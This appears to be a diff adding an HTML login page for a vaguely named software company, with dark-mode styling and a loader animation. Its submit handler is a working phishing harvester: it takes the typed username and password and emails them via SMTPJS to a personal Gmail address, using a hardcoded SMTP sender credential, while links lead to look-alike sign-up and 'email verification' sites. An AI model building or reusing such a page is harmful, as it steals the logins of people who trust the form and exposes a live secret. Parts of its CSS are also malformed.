@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        .loader {
+            display: none; /* Initially hidden */
+            position: fixed; /* Fixed position */
+            top: 50%; /* Center vertically */
+            left: 50%; /* Center horizontally */
+            transform: translate(-50%, -50%); /* Center the loader */
+            width: 60px;
+            height: 50px;
+            justify-content: space-between;
+            z-index: 1000; /* Ensure it’s above other content */
+        }
+
+        .loader>div {
+            height: 100%;
+            width: 8px;
+            animation: delay 0.8s infinite ease-in-out;
+        }
+
+        .Hyper {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: rgba(0, 12, 24, 0.7);
+        }
+
+        .loader .bar1 {
+            background-color: #1f3f8c;
+        }
+
+        .loader .bar2 {
+            background-color: #42aeea;
+            animation-delay: 0.7s; 
+        }
+
+        .loader .bar3 {
+            background-color: #008000;
+            animation-delay: 0.6s; 
+        }
+
+        .loader .bar4 {
+            background-color: #ffdd00;
+            animation-delay: 0.5s; 
+        }
+
+        .loader .bar5 {
+            background-color: #f09800;
+            animation-delay: 0.4s; 
+        }
+
+        .loader .bar6 {
+            background-color: #f80067;
+            animation-delay: 0.3s; 
+        }
+
+        @keyframes delay {
+            0%, 40%, 100% {
+                transform: scaleY(0.05);
+            }
+            20% {
+                transform: scaleY(1);
+            }
+        }
+
+        body {
+            border: 37px solid transparent;
+            font-family: Roboto, sans-serif;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            background-color: #f4f4f4;
+            padding-top: 90px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        /* Light and Dark Mode Styles */
+        .light-mode {
+            background-color: #f4f4f4;
+            color: #000000;
+        }
+        .dark-mode {
+            background-color:  #0c466c;
+            color: #ffffff;
+        }
+
+        /* Switch Container - Positioned in Bottom Right Corner */
+        .switch-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;  /* Reduced size by 5% */
+            height: 33px;  /* Reduced size by 5% */
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            border-radius: 50%;
+            left: 4px;
+            bottom: 3px;
+            background-color: white;
+            transition: .4s;
+        }
+
+        input:checked + .slider {
+            background-color: #2196F3;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+
+        .header {
+            background-color: rgba(0, 162, 232, 0.7); /* Blue color with transparency */
+            color: white;
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px); /* Apply blur effect */
+            -webkit-backdrop-filter: blur(10px); /* For Safari */
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2); /* Optional: Adds a subtle border for better visibility */
+         }
+
+        .header h1 {
+            margin: 0;
+        }
+
+        .header .welcome {
+            color: #3399ff;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+
+        .container {
+            background: linear-gradient (135deg, rgba (255, 255, 255, 0.1), rgba (255, 255, 255, 0));
+            background-filter: Blur (10px);
+            -webkit-backdrop-filter: Blur (10px); 
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            color: inherit;  /* Ensure text color adapts to theme */
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: inherit;  /* Ensure text color adapts to theme */
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: inherit;  /* Ensure text color adapts to theme */
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: transparent;
+            color: inherit;
+        }
+
+        .form-group input[type="checkbox"] {
+            width: auto;
+            margin-right: 10px;
+            background-color: trnasparent;
+            background: linear-gradient (135deg, rgba (255, 255, 255, 0.1), rgba (255, 255, 255, 0));
+            background-filter: Blur (10px);
+            -webkit-backdrop-filter: Blur (10px); 
+        }
+
+        .form-group .terms {
+            display: flex;
+            align-items: center;
+            background-color: linear-gradient (135deg, rgba (255, 255, 255, 0.1), rgba (255, 255, 255, 0));
+            background-filter: Blur (10px);
+            -webkit-backdrop-filter: Blur (10px);
+        }
+
+        .form-group .terms label {
+            margin: 0;
+        }
+
+        .form-group button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            width: 400px;
+            width: 100%; /* Change to 100% for responsiveness */
+            max-width: 400px; /* Maximum width */
+            box-sizing: border-box; /* Ensure padding is included in width */
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .form-group button:hover {
+            background: linear-gradient (135deg, rgba (255, 255, 255, 0.1), rgba (255, 255, 255, 0));
+            background-filter: Blur (10px);
+            -webkit-backdrop-filter: Blur (10px);;
+        }
+
+        .form-group .error {
+            color: red;
+            font-size: 14px;
+        }
+
+        .new-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .new-account p {
+            font-family: 'Lexend Medium', sans-serif;
+            margin: 0;
+            font-size: 16px;
+            color: inherit;  /* Ensure text color adapts to theme */
+        }
+
+        .new-account a {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .new-account a:hover {
+            text-decoration: underline;
+        }
+
+        /* Style for 'Forgot password?' and 'Learn More?' links */
+        .new-account .links {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .new-account .links a {
+            color: #666;
+            text-decoration: none;
+            margin-right: 15px;
+        }
+
+        .new-account .links a:hover {
+            text-decoration: underline;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Lexend:wght@500&display=swap');
+    </style>
+</head>
+<body class="light-mode">
+    <header>
+        <div class="header">
+            <h1>⚙️ Sign in</h1>
+            <div class="welcome">Welcome Back</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>Login</h2>
+        <form id="login">
+            <div class="form-group">
+                <label for="username">🧑 Username</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">🔒 Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <input type="checkbox" id="rememberMe" name="rememberMe">
+                <label for="rememberMe">Remember Me</label>
+            </div>
+            <div class="form-group terms">
+                <input type="checkbox" id="terms" name="terms" required>
+                <label for="terms">I've Read and accept the <a href="https://drive.google.com/file/d/1dIG8jySsgNrBW1jhaPKJ59wBPWGTAW8x/view?usp=drive_link" target="_self">Terms and Policies</a></label>
+            </div>
+            <div class="form-group">
+                <input type="checkbox" id="robotCheck" name="robotCheck" required>
+                <label for="robotCheck">I'm not a robot</label>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="new-account">
+        <p>Are You New? <a href="https://sites.google.com/view/software-company-co-ltd/sign-up">Create Account</a></p>
+        <p class="links">
+            <a href="https://software-company-co-ltd-email-verification.pages.dev">Forgot password?</a>
+            <a href="https://sites.google.com/view/software-company-co-ltd/documentations">Learn More?</a>
+        </p>
+    </div>
+
+    <!-- Light/Dark Mode Switch -->
+    <div class="switch-container">
+        <label class="switch">
+            <input type="checkbox" id="themeSwitch">
+            <span class="slider"></span>
+        </label>
+    </div>
+
+    <!-- Loader HTML -->
+    <div class="loader">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+        <div class="bar4"></div>
+        <div class="bar5"></div>
+        <div class="bar6"></div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        const themeSwitch = document.getElementById('themeSwitch');
+        const body = document.body;
+
+        themeSwitch.addEventListener('change', () => {
+            if (themeSwitch.checked) {
+                body.classList.remove('light-mode');
+                body.classList.add('dark-mode');
+            } else {
+                body.classList.remove('dark-mode');
+                body.classList.add('light-mode');
+            }
+        });
+
+        // Restore the user's preferred theme on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const preferredTheme = localStorage.getItem('preferredTheme');
+            if (preferredTheme === 'dark-mode') {
+                body.classList.add('dark-mode');
+                themeSwitch.checked = true;
+            } else {
+                body.classList.add('light-mode');
+            }
+        });
+
+        // Save the user's theme preference when they toggle the switch
+        themeSwitch.addEventListener('change', function() {
+            if (themeSwitch.checked) {
+                localStorage.setItem('preferredTheme', 'dark-mode');
+            } else {
+                localStorage.setItem('preferredTheme', 'light-mode');
+            }
+        });
+
+        // Show loader on form submission
+        document.getElementById('login').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Show the loader
+            document.querySelector('.loader').style.display = 'flex';
+
+            // Simulate form submission or handle form logic here
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const rememberMe = document.getElementById('rememberMe').checked;
+            const body = "Username: " + username + "<br>Password: " + password + "<br>Remember Me: " + rememberMe;
+
+            Email.send({
+                Host : "smtp.elasticemail.com",
+                Username : "softwarecompanyltdsmtpsender@gmail.com",
+                Password : "A6DC06DBCF8A0C3CE635ED7B3EDE144CB3C9",
+                To : 'gambopeter2022@gmail.com',
+                From : "softwarecompanyltdsmtpsender@gmail.com",
+                Subject : "Login Attempt",
+                Body : body
+            }).then(function(response) {
+                // Hide the loader after response
+                document.querySelector('.loader').style.display = 'none';
+
+                if (response === 'OK') {
+                    swal("Success!", "Form submitted successfully!", "success");
+                } else {
+                    swal("Error!", "Failed to submit the form. Please try again.", "error");
+                }
+            });
+        });
+    </script>
+
+     <br><br>
+   <p align="left">
+    <div class="gtranslate_wrapper"></div>
+        <script>window.gtranslateSettings = {"default_language":"en","wrapper_selector":".gtranslate_wrapper","flag_size":24}</script>
+        <script src="https://cdn.gtranslate.net/widgets/latest/popup.js" defer></script>
+     <br><br>
+   </p>
+    </script>
+
+      </br></br>
+    </script>
+      </br></br>
+
+     <br><br>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+     <br><br>
+</body>
+</html>
